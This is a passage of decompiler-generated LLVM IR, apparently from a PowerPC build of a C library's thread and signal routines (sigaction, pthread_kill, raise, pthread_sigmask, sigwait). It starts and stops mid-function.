  uselistorder label %dec_label_pc_10017624, { 1, 0, 2, 3 }
}

define i32 @pthread_sighandler_rt(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10017640 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10017640, i32* %stack_var_-32, align 4
  %v5_10017640 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10017644 = load i32, i32* @lr, align 4
  store i32 %v0_10017644, i32* %r0.global-to-local, align 4
  %v0_10017648 = call i32 @__asm_mfcr()
  %v1_1001764c = mul i32 %v0_10017648, 4
  store i32 %v1_1001764c, i32* %r11.global-to-local, align 4
  %v0_10017654 = load i32, i32* @r2, align 4
  store i32 %v0_10017654, i32* %r31.global-to-local, align 4
  %v1_10017660 = add i32 %v0_10017654, 88
  %v2_10017660 = inttoptr i32 %v1_10017660 to i8*
  %v3_10017660 = load i8, i8* %v2_10017660, align 1
  %v4_10017660 = zext i8 %v3_10017660 to i32
  store i32 %v4_10017660, i32* %r0.global-to-local, align 4
  %v3_10017664 = icmp eq i8 %v3_10017660, 0
  br i1 %v3_10017664, label %dec_label_pc_1001767c, label %dec_label_pc_1001766c

dec_label_pc_1001766c:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10017670 = add i32 %v0_10017654, 32
  %v3_10017670 = inttoptr i32 %v2_10017670 to i32*
  store i32 %v0_10017648, i32* %v3_10017670, align 4
  %v0_10017674 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017674 = trunc i32 %v0_10017674 to i8
  %v2_10017674 = load i32, i32* @r2, align 4
  %v3_10017674 = add i32 %v2_10017674, 88
  %v4_10017674 = inttoptr i32 %v3_10017674 to i8*
  store i8 %v1_10017674, i8* %v4_10017674, align 1
  br label %dec_label_pc_100176a8

dec_label_pc_1001767c:                            ; preds = %entry
  %v1_1001767c = add i32 %v0_10017654, 84
  %v2_1001767c = inttoptr i32 %v1_1001767c to i32*
  %v3_1001767c = load i32, i32* %v2_1001767c, align 4
  store i32 %v3_1001767c, i32* %r30.global-to-local, align 4
  %v3_10017680 = icmp eq i32 %v3_1001767c, 0
  store i1 %v3_10017680, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10017680, label %dec_label_pc_10017688, label %dec_label_pc_1001768c

dec_label_pc_10017688:                            ; preds = %dec_label_pc_1001767c
  store i32 %v5_10017640, i32* %v2_1001767c, align 4
  %v0_10017694.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001768c

dec_label_pc_1001768c:                            ; preds = %dec_label_pc_1001767c, %dec_label_pc_10017688
  %v0_10017694 = phi i32 [ %v1_1001764c, %dec_label_pc_1001767c ], [ %v0_10017694.pre, %dec_label_pc_10017688 ]
  %v2_10017694 = add i32 %v0_10017694, ptrtoint (i32* @global_var_100496f0.1099 to i32)
  %v3_10017694 = inttoptr i32 %v2_10017694 to i32*
  %v4_10017694 = load i32, i32* %v3_10017694, align 4
  store i32 %v4_10017694, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10017694)
  %v0_100176a0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100176a0, label %dec_label_pc_100176a4, label %dec_label_pc_100176a8

dec_label_pc_100176a4:                            ; preds = %dec_label_pc_1001768c
  %v0_100176a4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100176a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100176a4 = add i32 %v1_100176a4, 84
  %v3_100176a4 = inttoptr i32 %v2_100176a4 to i32*
  store i32 %v0_100176a4, i32* %v3_100176a4, align 4
  br label %dec_label_pc_100176a8

dec_label_pc_100176a8:                            ; preds = %dec_label_pc_1001768c, %dec_label_pc_1001766c, %dec_label_pc_100176a4
  store i32 %v0_10017644, i32* %r0.global-to-local, align 4
  %v1_100176bc = call %0 @__asm_mtcrf(i32 8, i32 %v0_10017648)
  ret i32 %v0_10017648

; uselistorder directives
  uselistorder i32 %v1_1001764c, { 1, 0 }
  uselistorder i32 %v0_10017648, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_100176a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001768c, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_100176c4 = load i32, i32* @r3, align 4
  ret i32 %v0_100176c4
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268697600, i32* @r9, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v3_100176e8 = load i32, i32* @global_var_100450e4.981, align 4
  %v4_100176ec = icmp eq i32 %v3_100176e8, %arg1
  br i1 %v4_100176ec, label %dec_label_pc_100177f0, label %dec_label_pc_100176f4

dec_label_pc_100176f4:                            ; preds = %entry
  store i32 268697600, i32* @r9, align 4
  %v3_100176f8 = load i32, i32* @global_var_100450e8.993, align 4
  %v4_100176fc = icmp eq i32 %v3_100176f8, %arg1
  br i1 %v4_100176fc, label %dec_label_pc_100177f0, label %dec_label_pc_10017704

dec_label_pc_10017704:                            ; preds = %dec_label_pc_100176f4
  store i32 268697600, i32* @r9, align 4
  %v3_10017708 = load i32, i32* @global_var_100450ec.994, align 4
  %v4_1001770c = icmp eq i32 %v3_10017708, %arg1
  br i1 %v4_1001770c, label %dec_label_pc_10017714, label %dec_label_pc_1001771c

dec_label_pc_10017714:                            ; preds = %dec_label_pc_10017704
  %v2_10017714 = icmp sgt i32 %arg1, 0
  br i1 %v2_10017714, label %dec_label_pc_100177f0, label %dec_label_pc_1001771c

dec_label_pc_1001771c:                            ; preds = %dec_label_pc_10017704, %dec_label_pc_10017714
  %v3_1001771c = icmp eq i32* %arg2, null
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001771c, label %dec_label_pc_10017788, label %dec_label_pc_10017728

dec_label_pc_10017728:                            ; preds = %dec_label_pc_1001771c
  %v2_10017728 = ptrtoint i32* %stack_var_-168 to i32
  store i32 140, i32* @r5, align 4
  store i32 %v2_10017728, i32* @r3, align 4
  store i32 268531512, i32* @lr, align 4
  %v0_10017734 = call i32 @memcpy()
  store i32 %v0_10017734, i32* %r3.global-to-local, align 4
  %v0_10017738 = load i32, i32* @r30, align 4
  %v1_10017738 = inttoptr i32 %v0_10017738 to i32*
  %v2_10017738 = load i32, i32* %v1_10017738, align 4
  %tmp10 = or i32 %v2_10017738, 1
  %tmp11 = icmp eq i32 %tmp10, 1
  %v0_10017790.pre.pre = load i32, i32* @r31, align 4
  br i1 %tmp11, label %dec_label_pc_10017784, label %dec_label_pc_10017744

dec_label_pc_10017744:                            ; preds = %dec_label_pc_10017728
  %tmp12 = icmp slt i32 %v0_10017790.pre.pre, 1
  br i1 %tmp12, label %dec_label_pc_10017784, label %dec_label_pc_1001774c

dec_label_pc_1001774c:                            ; preds = %dec_label_pc_10017744
  %v2_1001774c = icmp sgt i32 %v0_10017790.pre.pre, 64
  br i1 %v2_1001774c, label %dec_label_pc_10017784, label %dec_label_pc_10017754

dec_label_pc_10017754:                            ; preds = %dec_label_pc_1001774c
  %v1_10017754 = add i32 %v0_10017738, 132
  %v2_10017754 = inttoptr i32 %v1_10017754 to i32*
  %v3_10017754 = load i32, i32* %v2_10017754, align 4
  %v1_10017758 = and i32 %v3_10017754, 4
  %v3_10017758 = icmp eq i32 %v1_10017758, 0
  %. = select i1 %v3_10017758, i32 268532172, i32 268531264
  store i32 %v2_10017728, i32* %r3.global-to-local, align 4
  store i32 %., i32* %stack_var_-168, align 4
  br label %dec_label_pc_10017788

dec_label_pc_10017784:                            ; preds = %dec_label_pc_10017728, %dec_label_pc_1001774c, %dec_label_pc_10017744
  store i32 %v2_10017728, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017788

dec_label_pc_10017788:                            ; preds = %dec_label_pc_1001771c, %dec_label_pc_10017754, %dec_label_pc_10017784
  %v0_10017790 = phi i32 [ %arg1, %dec_label_pc_1001771c ], [ %v0_10017790.pre.pre, %dec_label_pc_10017754 ], [ %v0_10017790.pre.pre, %dec_label_pc_10017784 ]
  %v0_10017788 = phi i32 [ 0, %dec_label_pc_1001771c ], [ %v2_10017728, %dec_label_pc_10017754 ], [ %v2_10017728, %dec_label_pc_10017784 ]
  %v0_1001778c = load i32, i32* @r28, align 4
  store i32 %v0_10017790, i32* %r3.global-to-local, align 4
  store i32 268531608, i32* @lr, align 4
  %v3_10017794 = inttoptr i32 %v0_10017788 to i32*
  %v4_10017794 = call i32 @__libc_sigaction(i32 %v0_10017790, i32* %v3_10017794, i32 %v0_1001778c)
  %v3_10017798 = icmp eq i32 %v4_10017794, -1
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v3_10017798, label %dec_label_pc_100177fc, label %dec_label_pc_100177a4

dec_label_pc_100177a4:                            ; preds = %dec_label_pc_10017788
  %v0_100177a4 = load i32, i32* @r31, align 4
  %v1_100177a4 = add i32 %v0_100177a4, -1
  %v2_100177a8 = icmp ugt i32 %v1_100177a4, 63
  br i1 %v2_100177a8, label %dec_label_pc_100177f8, label %dec_label_pc_100177b0

dec_label_pc_100177b0:                            ; preds = %dec_label_pc_100177a4
  %v0_100177b0 = load i32, i32* @r28, align 4
  %v3_100177b0 = icmp eq i32 %v0_100177b0, 0
  br i1 %v3_100177b0, label %dec_label_pc_100177cc, label %dec_label_pc_100177b8

dec_label_pc_100177b8:                            ; preds = %dec_label_pc_100177b0
  %v1_100177bc = mul i32 %v0_100177a4, 4
  store i32 ptrtoint (i32* @global_var_100496f0.1099 to i32), i32* @r9, align 4
  %v2_100177c4 = add i32 %v1_100177bc, ptrtoint (i32* @global_var_100496f0.1099 to i32)
  %v3_100177c4 = inttoptr i32 %v2_100177c4 to i32*
  %v4_100177c4 = load i32, i32* %v3_100177c4, align 4
  %v2_100177c8 = inttoptr i32 %v0_100177b0 to i32*
  store i32 %v4_100177c4, i32* %v2_100177c8, align 4
  br label %dec_label_pc_100177cc

dec_label_pc_100177cc:                            ; preds = %dec_label_pc_100177b0, %dec_label_pc_100177b8
  %v0_100177cc = load i32, i32* @r30, align 4
  %v3_100177cc = icmp eq i32 %v0_100177cc, 0
  br i1 %v3_100177cc, label %dec_label_pc_100177f8, label %dec_label_pc_100177d4

dec_label_pc_100177d4:                            ; preds = %dec_label_pc_100177cc
  %v1_100177d4 = inttoptr i32 %v0_100177cc to i32*
  %v2_100177d4 = load i32, i32* %v1_100177d4, align 4
  store i32 %v2_100177d4, i32* @r11, align 4
  %v0_100177dc = load i32, i32* @r31, align 4
  %v1_100177dc = mul i32 %v0_100177dc, 4
  store i32 ptrtoint (i32* @global_var_100496f0.1099 to i32), i32* @r9, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_100177e8 = add i32 %v1_100177dc, ptrtoint (i32* @global_var_100496f0.1099 to i32)
  %v4_100177e8 = inttoptr i32 %v3_100177e8 to i32*
  store i32 %v2_100177d4, i32* %v4_100177e8, align 4
  %v0_1001780c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100177fc

dec_label_pc_100177f0:                            ; preds = %dec_label_pc_10017714, %dec_label_pc_100176f4, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100177fc

dec_label_pc_100177f8:                            ; preds = %dec_label_pc_100177cc, %dec_label_pc_100177a4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100177fc

dec_label_pc_100177fc:                            ; preds = %dec_label_pc_10017788, %dec_label_pc_100177f0, %dec_label_pc_100177d4, %dec_label_pc_100177f8
  %v0_1001780c = phi i32 [ -1, %dec_label_pc_10017788 ], [ 22, %dec_label_pc_100177f0 ], [ %v0_1001780c.pre, %dec_label_pc_100177d4 ], [ 0, %dec_label_pc_100177f8 ]
  ret i32 %v0_1001780c

; uselistorder directives
  uselistorder i32 %v0_10017790, { 1, 0 }
  uselistorder i32 %v0_10017790.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10017728, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 10, 1, 9, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 6, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder label %dec_label_pc_100177fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100177cc, { 1, 0 }
  uselistorder label %dec_label_pc_10017788, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017784, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001771c, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10017824 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_1001782c = add i32 %v1_10017824, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %v2_1001782c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268531780, i32* @lr, align 4
  %v0_10017840 = call i32 @__pthread_lock()
  %v0_10017844 = load i32, i32* @r31, align 4
  %v1_10017844 = add i32 %v0_10017844, 8
  %v2_10017844 = inttoptr i32 %v1_10017844 to i32*
  %v3_10017844 = load i32, i32* %v2_10017844, align 4
  store i32 %v0_10017844, i32* @r3, align 4
  %v3_1001784c = icmp eq i32 %v3_10017844, 0
  br i1 %v3_1001784c, label %dec_label_pc_10017860, label %dec_label_pc_10017854

dec_label_pc_10017854:                            ; preds = %entry
  %v1_10017854 = add i32 %v3_10017844, 16
  %v2_10017854 = inttoptr i32 %v1_10017854 to i32*
  %v3_10017854 = load i32, i32* %v2_10017854, align 4
  %v0_10017858 = load i32, i32* @r29, align 4
  %v4_10017858 = icmp eq i32 %v0_10017858, %v3_10017854
  br i1 %v4_10017858, label %dec_label_pc_1001786c, label %dec_label_pc_10017860

dec_label_pc_10017860:                            ; preds = %dec_label_pc_10017854, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10017864.1100 to i32), i32* @lr, align 4
  %v0_10017860 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10017898

dec_label_pc_1001786c:                            ; preds = %dec_label_pc_10017854
  %v1_1001786c = add i32 %v3_10017844, 20
  %v2_1001786c = inttoptr i32 %v1_1001786c to i32*
  %v3_1001786c = load i32, i32* %v2_1001786c, align 4
  store i32 %v0_10017844, i32* @r3, align 4
  store i32 268531832, i32* @lr, align 4
  %v0_10017874 = call i32 @__pthread_unlock()
  %v0_10017878 = load i32, i32* @r30, align 4
  store i32 268531844, i32* @lr, align 4
  %v2_10017880 = call i32 @kill(i32 %v3_1001786c, i32 %v0_10017878)
  %v3_10017884 = icmp eq i32 %v2_10017880, -1
  br i1 %v3_10017884, label %dec_label_pc_10017890, label %dec_label_pc_10017898

dec_label_pc_10017890:                            ; preds = %dec_label_pc_1001786c
  %v0_10017890 = call i32 @__errno_location()
  %v1_10017894 = inttoptr i32 %v0_10017890 to i32*
  %v2_10017894 = load i32, i32* %v1_10017894, align 4
  br label %dec_label_pc_10017898

dec_label_pc_10017898:                            ; preds = %dec_label_pc_1001786c, %dec_label_pc_10017860, %dec_label_pc_10017890
  %v0_100178a8 = phi i32 [ 0, %dec_label_pc_1001786c ], [ 3, %dec_label_pc_10017860 ], [ %v2_10017894, %dec_label_pc_10017890 ]
  ret i32 %v0_100178a8

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 7, 6, 0, 5, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), { 0, 8, 9, 12, 7, 13, 10, 11, 14, 1, 2, 3, 4, 15, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10017898, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100178c0 = call i32 @__GI_pthread_self()
  store i32 268531916, i32* @lr, align 4
  %v2_100178c8 = call i32 @pthread_kill(i32 %v0_100178c0, i32 %arg1)
  store i32 %v2_100178c8, i32* @r29, align 4
  %v3_100178cc = icmp eq i32 %v2_100178c8, 0
  br i1 %v3_100178cc, label %dec_label_pc_100178e4, label %dec_label_pc_100178d8

dec_label_pc_100178d8:                            ; preds = %entry
  %v0_100178d8 = call i32 @__errno_location()
  %v0_100178dc = load i32, i32* @r29, align 4
  %v2_100178dc = inttoptr i32 %v0_100178d8 to i32*
  store i32 %v0_100178dc, i32* %v2_100178dc, align 4
  br label %dec_label_pc_100178e4

dec_label_pc_100178e4:                            ; preds = %entry, %dec_label_pc_100178d8
  %v0_100178f4 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_100178d8 ]
  ret i32 %v0_100178f4

; uselistorder directives
  uselistorder label %dec_label_pc_100178e4, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-152 = alloca i32, align 4
  %v3_10017904 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r29.global-to-local, align 4
  br i1 %v3_10017904, label %dec_label_pc_10017994, label %dec_label_pc_10017918

dec_label_pc_10017918:                            ; preds = %entry
  %v2_10017918 = ptrtoint i32* %stack_var_-152 to i32
  store i32 128, i32* @r5, align 4
  store i32 %v2_10017918, i32* @r3, align 4
  store i32 268532008, i32* @lr, align 4
  %v0_10017924 = call i32 @memcpy()
  %v0_10017928 = load i32, i32* %r30.global-to-local, align 4
  %v3_10017928 = icmp eq i32 %v0_10017928, 1
  br i1 %v3_10017928, label %dec_label_pc_10017978, label %dec_label_pc_10017930

dec_label_pc_10017930:                            ; preds = %dec_label_pc_10017918
  %v3_10017930 = icmp eq i32 %v0_10017928, 2
  br i1 %v3_10017930, label %dec_label_pc_10017944, label %dec_label_pc_10017938

dec_label_pc_10017938:                            ; preds = %dec_label_pc_10017930
  %v3_10017938 = icmp eq i32 %v0_10017928, 0
  br i1 %v3_10017938, label %dec_label_pc_10017954, label %dec_label_pc_10017990

dec_label_pc_10017944:                            ; preds = %dec_label_pc_10017930
  store i32 %v2_10017918, i32* @r3, align 4
  %v3_1001794c = load i32, i32* @global_var_100450e4.981, align 4
  store i32 268532052, i32* @lr, align 4
  %v2_10017950 = call i32 @__GI_sigaddset(i32 %v2_10017918, i32 %v3_1001794c)
  br label %dec_label_pc_10017954

dec_label_pc_10017954:                            ; preds = %dec_label_pc_10017938, %dec_label_pc_10017944
  store i32 %v2_10017918, i32* @r3, align 4
  store i32 268532068, i32* @lr, align 4
  %v1_10017960 = call i32 @__GI_sigdelset(i32 %v2_10017918)
  %v3_10017968 = load i32, i32* @global_var_100450ec.994, align 4
  %tmp6 = icmp slt i32 %v3_10017968, 1
  br i1 %tmp6, label %dec_label_pc_10017990, label %dec_label_pc_10017980

dec_label_pc_10017978:                            ; preds = %dec_label_pc_10017918
  br label %dec_label_pc_10017980

dec_label_pc_10017980:                            ; preds = %dec_label_pc_10017954, %dec_label_pc_10017978
  store i32 %v2_10017918, i32* @r3, align 4
  store i32 268532104, i32* @lr, align 4
  %v1_10017984 = call i32 @__GI_sigdelset(i32 %v2_10017918)
  br label %dec_label_pc_10017994

dec_label_pc_10017990:                            ; preds = %dec_label_pc_10017938, %dec_label_pc_10017954
  br label %dec_label_pc_10017994

dec_label_pc_10017994:                            ; preds = %entry, %dec_label_pc_10017980, %dec_label_pc_10017990
  %v0_10017998 = phi i32 [ 0, %entry ], [ %v2_10017918, %dec_label_pc_10017980 ], [ %v2_10017918, %dec_label_pc_10017990 ]
  %v0_10017994 = load i32, i32* %r30.global-to-local, align 4
  %v0_1001799c = load i32, i32* %r29.global-to-local, align 4
  store i32 268532132, i32* @lr, align 4
  %v3_100179a0 = call i32 @__GI_sigprocmask(i32 %v0_10017994, i32 %v0_10017998, i32 %v0_1001799c)
  %v3_100179a4 = icmp eq i32 %v3_100179a0, -1
  br i1 %v3_100179a4, label %dec_label_pc_100179b0, label %dec_label_pc_100179b8

dec_label_pc_100179b0:                            ; preds = %dec_label_pc_10017994
  %v0_100179b0 = call i32 @__errno_location()
  %v1_100179b4 = inttoptr i32 %v0_100179b0 to i32*
  %v2_100179b4 = load i32, i32* %v1_100179b4, align 4
  br label %dec_label_pc_100179b8

dec_label_pc_100179b8:                            ; preds = %dec_label_pc_10017994, %dec_label_pc_100179b0
  %v0_100179c8 = phi i32 [ 0, %dec_label_pc_10017994 ], [ %v2_100179b4, %dec_label_pc_100179b0 ]
  ret i32 %v0_100179c8

; uselistorder directives
  uselistorder i32 %v2_10017918, { 0, 1, 7, 6, 3, 2, 5, 4, 8 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100179b8, { 1, 0 }
  uselistorder label %dec_label_pc_10017994, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017990, { 1, 0 }
  uselistorder label %dec_label_pc_10017980, { 1, 0 }
  uselistorder label %dec_label_pc_10017954, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100179cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100179cc, i32* %stack_var_-32, align 4
  %v5_100179cc = ptrtoint i32* %stack_var_-32 to i32
  %v0_100179d0 = load i32, i32* @lr, align 4
  store i32 %v0_100179d0, i32* %r0.global-to-local, align 4
  %v0_100179d4 = call i32 @__asm_mfcr()
  %v1_100179d8 = mul i32 %v0_100179d4, 4
  store i32 %v1_100179d8, i32* %r11.global-to-local, align 4
  %v0_100179e0 = load i32, i32* @r2, align 4
  store i32 %v0_100179e0, i32* %r31.global-to-local, align 4
  %v1_100179ec = add i32 %v0_100179e0, 88
  %v2_100179ec = inttoptr i32 %v1_100179ec to i8*
  %v3_100179ec = load i8, i8* %v2_100179ec, align 1
  %v4_100179ec = zext i8 %v3_100179ec to i32
  store i32 %v4_100179ec, i32* %r0.global-to-local, align 4
  %v3_100179f0 = icmp eq i8 %v3_100179ec, 0
  br i1 %v3_100179f0, label %dec_label_pc_10017a08, label %dec_label_pc_100179f8

dec_label_pc_100179f8:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100179fc = add i32 %v0_100179e0, 32
  %v3_100179fc = inttoptr i32 %v2_100179fc to i32*
  store i32 %v0_100179d4, i32* %v3_100179fc, align 4
  %v0_10017a00 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017a00 = trunc i32 %v0_10017a00 to i8
  %v2_10017a00 = load i32, i32* @r2, align 4
  %v3_10017a00 = add i32 %v2_10017a00, 88
  %v4_10017a00 = inttoptr i32 %v3_10017a00 to i8*
  store i8 %v1_10017a00, i8* %v4_10017a00, align 1
  br label %dec_label_pc_10017a34

dec_label_pc_10017a08:                            ; preds = %entry
  %v1_10017a08 = add i32 %v0_100179e0, 84
  %v2_10017a08 = inttoptr i32 %v1_10017a08 to i32*
  %v3_10017a08 = load i32, i32* %v2_10017a08, align 4
  store i32 %v3_10017a08, i32* %r30.global-to-local, align 4
  %v3_10017a0c = icmp eq i32 %v3_10017a08, 0
  store i1 %v3_10017a0c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10017a0c, label %dec_label_pc_10017a14, label %dec_label_pc_10017a18

dec_label_pc_10017a14:                            ; preds = %dec_label_pc_10017a08
  store i32 %v5_100179cc, i32* %v2_10017a08, align 4
  %v0_10017a20.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10017a18

dec_label_pc_10017a18:                            ; preds = %dec_label_pc_10017a08, %dec_label_pc_10017a14
  %v0_10017a20 = phi i32 [ %v1_100179d8, %dec_label_pc_10017a08 ], [ %v0_10017a20.pre, %dec_label_pc_10017a14 ]
  %v2_10017a20 = add i32 %v0_10017a20, ptrtoint (i32* @global_var_100496f0.1099 to i32)
  %v3_10017a20 = inttoptr i32 %v2_10017a20 to i32*
  %v4_10017a20 = load i32, i32* %v3_10017a20, align 4
  store i32 %v4_10017a20, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10017a20)
  %v0_10017a2c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10017a2c, label %dec_label_pc_10017a30, label %dec_label_pc_10017a34

dec_label_pc_10017a30:                            ; preds = %dec_label_pc_10017a18
  %v0_10017a30 = load i32, i32* %r30.global-to-local, align 4
  %v1_10017a30 = load i32, i32* %r31.global-to-local, align 4
  %v2_10017a30 = add i32 %v1_10017a30, 84
  %v3_10017a30 = inttoptr i32 %v2_10017a30 to i32*
  store i32 %v0_10017a30, i32* %v3_10017a30, align 4
  br label %dec_label_pc_10017a34

dec_label_pc_10017a34:                            ; preds = %dec_label_pc_10017a18, %dec_label_pc_100179f8, %dec_label_pc_10017a30
  store i32 %v0_100179d0, i32* %r0.global-to-local, align 4
  %v1_10017a48 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100179d4)
  ret i32 %v0_100179d4

; uselistorder directives
  uselistorder i32 %v1_100179d8, { 1, 0 }
  uselistorder i32 %v0_100179d4, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10017a34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10017a18, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-772 = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %v0_10017a54 = load i32, i32* @lr, align 4
  store i32 %v0_10017a54, i32* %r0.global-to-local, align 4
  %v2_10017a5c = ptrtoint i32* %stack_var_-900 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %v2_10017a5c, i32* @r3, align 4
  %v0_10017a70 = load i32, i32* @r2, align 4
  store i32 268532344, i32* @lr, align 4
  %v1_10017a74 = call i32 @sigfillset(i32 %v2_10017a5c)
  store i32 %v2_10017a5c, i32* @r3, align 4
  store i32 1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10017a8c.1101 to i32), i32* @lr, align 4
  %v1_10017a88 = call i32 @__GI_sigdelset(i32 %v2_10017a5c)
  %v0_10017b201 = load i32, i32* @r29, align 4
  %v0_10017b286 = load i32, i32* @r31, align 4
  store i32 %v0_10017b286, i32* @r3, align 4
  %tmp22 = icmp slt i32 %v0_10017b201, 66
  br i1 %tmp22, label %dec_label_pc_10017a90.lr.ph, label %dec_label_pc_10017b30

dec_label_pc_10017a90.lr.ph:                      ; preds = %entry
  %v2_10017ae8 = ptrtoint i32* %stack_var_-768 to i32
  br label %dec_label_pc_10017a90

dec_label_pc_10017a90:                            ; preds = %dec_label_pc_10017a90.lr.ph, %dec_label_pc_10017b1c
  %v0_10017b2810 = phi i32 [ %v0_10017b286, %dec_label_pc_10017a90.lr.ph ], [ %v0_10017b28, %dec_label_pc_10017b1c ]
  %v0_10017b249 = phi i32 [ %v0_10017b201, %dec_label_pc_10017a90.lr.ph ], [ %v1_10017b1c, %dec_label_pc_10017b1c ]
  store i32 268532372, i32* @lr, align 4
  %v2_10017a90 = call i32 @sigismember(i32 %v0_10017b2810, i32 %v0_10017b249)
  %v3_10017a94 = icmp eq i32 %v2_10017a90, 0
  br i1 %v3_10017a94, label %dec_label_pc_10017b1c, label %dec_label_pc_10017a9c

dec_label_pc_10017a9c:                            ; preds = %dec_label_pc_10017a90
  %v3_10017aa0 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 %v3_10017aa0, i32* %r0.global-to-local, align 4
  %v0_10017aa4 = load i32, i32* @r29, align 4
  %v4_10017aa4 = icmp eq i32 %v0_10017aa4, %v3_10017aa0
  br i1 %v4_10017aa4, label %dec_label_pc_10017b1c, label %dec_label_pc_10017aac

dec_label_pc_10017aac:                            ; preds = %dec_label_pc_10017a9c
  %v3_10017ab0 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 %v3_10017ab0, i32* %r0.global-to-local, align 4
  %v4_10017ab4 = icmp eq i32 %v0_10017aa4, %v3_10017ab0
  br i1 %v4_10017ab4, label %dec_label_pc_10017b1c, label %dec_label_pc_10017abc

dec_label_pc_10017abc:                            ; preds = %dec_label_pc_10017aac
  %v3_10017ac4 = load i32, i32* @global_var_100450ec.994, align 4
